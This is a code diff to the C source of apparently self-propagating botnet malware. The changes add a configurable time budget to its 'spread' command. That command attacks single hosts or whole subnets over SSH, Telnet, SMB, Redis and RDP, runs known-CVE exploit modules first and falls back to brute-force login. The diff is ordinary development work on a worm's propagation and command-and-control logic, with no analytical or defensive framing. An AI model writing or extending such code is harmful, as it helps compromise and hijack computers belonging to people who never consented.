@@ -2326,6 +2326,9 @@ int protocol_process_commands(notnet_bot_t *bot) {
              * `spread <ip>:<port>` command per host. */
             if (strchr(args, '/')) {
                 log_info("CMD: spread subnet %s", args);
+                /* #191: arm the budget for the threaded spreader too —
+                 * each per-host vector run is bounded by it. */
+                spread_set_budget_ms((long)bot->spread_budget_ms);
                 uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
                 if (spawn_scan_threads(bot, args, all_services) == 0) {
                     bot->scan_count++;
@@ -2338,6 +2341,10 @@ int protocol_process_commands(notnet_bot_t *bot) {
             if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                 log_info("CMD: spread %s:%d", host, port);
                 int spread_ok = -1;
+                /* #191: arm the per-command brute-force budget so no
+                 * spread vector can stall the command loop past the
+                 * configured wall-clock limit. */
+                spread_set_budget_ms((long)bot->spread_budget_ms);
                 /* #83: CVE-first — known-CVE modules are the primary
                  * vector; brute-force spreaders run only as fallback. */
                 if (cve_run_modules(bot, host, port) == 0) {
@@ -2936,6 +2943,14 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 int v = atoi(value);
                 if (v >= 1 && v <= 65535) {
                     bot->scan_max_hosts = v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "spread_budget_ms") == 0) {
+                /* #191: per-command brute-force wall-clock budget.
+                 * Clamped to the same range load_config enforces. */
+                long v = atol(value);
+                if (v >= SPREAD_BUDGET_MIN_MS && v <= SPREAD_BUDGET_MAX_MS) {
+                    bot->spread_budget_ms = (uint32_t)v;
                     applied = 1;
                 }
             } else if (strcmp(key, "flux_enabled") == 0) {
@@ -4028,6 +4043,12 @@ int load_config(notnet_bot_t *bot, const char *path) {
             bot->telnet_enabled = atoi(value);
         } else if (strcmp(key, "scan_timeout_ms") == 0) {
             bot->scan_timeout_ms = atoi(value);
+        } else if (strcmp(key, "spread_budget_ms") == 0) {
+            /* #191: clamp to the same range config_set enforces */
+            long v = atol(value);
+            if (v < SPREAD_BUDGET_MIN_MS) v = SPREAD_BUDGET_MIN_MS;
+            if (v > SPREAD_BUDGET_MAX_MS) v = SPREAD_BUDGET_MAX_MS;
+            bot->spread_budget_ms = (uint32_t)v;
         } else if (strcmp(key, "scan_max_hosts") == 0) {
             bot->scan_max_hosts = atoi(value);
         } else if (strcmp(key, "heartbeat_interval") == 0) {
